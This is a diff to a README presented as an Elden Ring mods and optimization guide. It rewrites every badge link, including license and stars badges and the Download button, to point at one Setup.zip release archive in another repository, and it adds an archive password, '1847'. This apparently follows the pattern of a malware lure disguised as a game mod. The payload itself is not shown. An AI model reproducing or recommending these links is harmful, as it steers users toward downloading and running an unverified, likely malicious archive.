@@ -1,10 +1,10 @@
 # 🎮 Elden Ring Mods — Optimization Pack, Tips & Ultimate Guide 2026
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Elden-Ring)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Singleplayer-blue)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Elden-Ring)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
+[![Category](https://img.shields.io/badge/Category-Singleplayer-blue)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
 
 ---
 
@@ -23,7 +23,7 @@
 
 ## 📥 Download
 
-[![Elden Ring Mods](https://img.shields.io/badge/Download%20Elden%20Ring%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![Elden Ring Mods](https://img.shields.io/badge/Download%20Elden%20Ring%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
